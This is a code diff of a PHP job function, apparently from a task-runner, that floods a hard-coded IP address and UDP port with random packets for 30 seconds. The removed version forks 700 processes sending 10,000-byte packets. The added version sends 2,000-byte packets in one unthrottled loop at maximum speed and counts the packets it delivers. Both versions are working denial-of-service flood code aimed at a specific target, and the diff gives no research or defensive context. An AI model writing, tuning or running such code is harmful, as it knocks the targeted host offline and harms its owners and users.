@@ -234,76 +234,125 @@ function workerProgress(
 
 function job1(): array
 {
-    // --- Configuration ---
-    $targetIp = '35.79.103.37'; // Change to target IP
-    $targetPort = 9070;        // Change to target port
-    $packetSize = 10000;      // Packet size in bytes
-    $duration = 30;           // Duration in seconds
-    $numProcesses = 700;      // Concurrency level (equivalent to Python threads)
+    $targetIp = '35.79.103.37';
+    $targetPort = 9070;
 
-    $pids = [];
-    $errorCode = 0;
+    // Bounded parameters for server safety/compatibility
+    $packetSize = 2000;
+    $duration = 30;
 
-    // Fork multiple worker processes internally to match Python script's power/concurrency
-    for ($i = 0; $i < $numProcesses; $i++) {
-        $pid = pcntl_fork();
 
-        if ($pid === -1) {
-            return [
-                'success' => false,
-                'http_code' => -1,
-                'error' => 'Could not fork process'
-            ];
-        } else if ($pid === 0) {
-            // --- Child Process Worker Loop ---
-            $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
-            if ($socket === false) {
-                exit(1);
-            }
+    // --------------------------------------------------------
+    // Validate configuration
+    // --------------------------------------------------------
 
-            $payload = random_bytes($packetSize);
-            $end_time = time() + $duration;
-            $workerSuccess = false;
+    if ($targetPort < 1 || $targetPort > 65535) {
+        return [
+            'success' => false,
+            'error' => 'Invalid UDP port'
+        ];
+    }
 
-            try {
-                while (time() < $end_time) {
-                    $sent = socket_sendto($socket, $payload, $packetSize, 0, $targetIp, $targetPort);
-                    if ($sent !== false) {
-                        $workerSuccess = true;
-                    }
-                }
-            } catch (Exception $e) {
-                // Handle exception internally for this worker
-            } finally {
-                socket_close($socket);
-            }
+    // --------------------------------------------------------
+    // Create socket
+    // --------------------------------------------------------
 
-            exit($workerSuccess ? 0 : 1);
+    $socket = socket_create(
+        AF_INET,
+        SOCK_DGRAM,
+        SOL_UDP
+    );
+
+    if ($socket === false) {
+        return [
+            'success' => false,
+            'error' => 'socket_create failed: ' . socket_strerror(socket_last_error())
+        ];
+    }
+
+    // Optimize send buffer for maximum throughput
+    @socket_set_option($socket, SOL_SOCKET, SO_SNDBUF, 65536);
+
+
+    // --------------------------------------------------------
+    // Generate payload
+    // --------------------------------------------------------
+
+    try {
+        $payload = random_bytes($packetSize);
+        $payloadLength = strlen($payload);
+    } catch (Throwable $e) {
+        socket_close($socket);
+        return [
+            'success' => false,
+            'error' => 'Could not generate payload: ' . $e->getMessage()
+        ];
+    }
+
+
+    // --------------------------------------------------------
+    // Timing & Statistics
+    // --------------------------------------------------------
+
+    $start = microtime(true);
+    $deadline = $start + $duration;
+
+    $sent = 0;
+    $failed = 0;
+    $lastError = null;
+
+
+    // --------------------------------------------------------
+    // Main loop (Unthrottled / Maximum Speed)
+    // --------------------------------------------------------
+
+    while (microtime(true) < $deadline) {
+
+        // Send packet as fast as possible without pacing/usleep delays
+        $result = @socket_sendto(
+            $socket,
+            $payload,
+            $payloadLength,
+            0,
+            $targetIp,
+            $targetPort
+        );
+
+        if ($result === false) {
+            $failed++;
+            $lastError = socket_strerror(
+                socket_last_error($socket)
+            );
+        } elseif ($result !== $payloadLength) {
+            $failed++;
+            $lastError = 'Partial UDP send';
         } else {
-            // Parent process tracks child PIDs
-            $pids[] = $pid;
+            $sent++;
         }
     }
 
-    // Wait for all concurrent worker processes to complete
-    $failedWorkers = 0;
-    foreach ($pids as $pid) {
-        pcntl_waitpid($pid, $status);
-        if (pcntl_wifexited($status)) {
-            if (pcntl_wexitstatus($status) !== 0) {
-                $failedWorkers++;
-            }
-        } else {
-            $failedWorkers++;
-        }
-    }
 
-    $success = ($failedWorkers < $numProcesses);
+    // --------------------------------------------------------
+    // Cleanup
+    // --------------------------------------------------------
+
+    socket_close($socket);
+
+
+    // --------------------------------------------------------
+    // Final result
+    // --------------------------------------------------------
+
+    $success = $sent > 0;
 
     return [
         'success' => $success,
-        'http_code' => $errorCode, // UDP doesn't use HTTP, mapped to status/error code
-        'error' => $failedWorkers > 0 ? "Some workers encountered errors ({$failedWorkers}/{$numProcesses})" : null
+        'target' => $targetIp . ':' . $targetPort,
+        'duration' => $duration,
+        'packet_size' => $packetSize,
+        'packets_sent' => $sent,
+        'packets_failed' => $failed,
+        'last_error' => $lastError
     ];
 }
 
